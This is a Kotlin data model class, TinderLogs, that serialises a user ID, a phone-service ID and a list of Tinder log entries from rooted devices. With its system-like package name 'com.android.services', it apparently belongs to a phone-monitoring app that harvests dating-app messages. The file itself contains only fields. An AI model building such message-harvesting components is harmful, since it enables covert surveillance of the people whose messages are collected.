package com.android.services.models.im

import com.android.services.db.entities.TinderRooted
import com.google.gson.annotations.SerializedName

class TinderLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("tinderLogs")
    var tinderList: List<TinderRooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, tinderUnrootedList: List<TinderRooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        tinderList = tinderUnrootedList
    }
}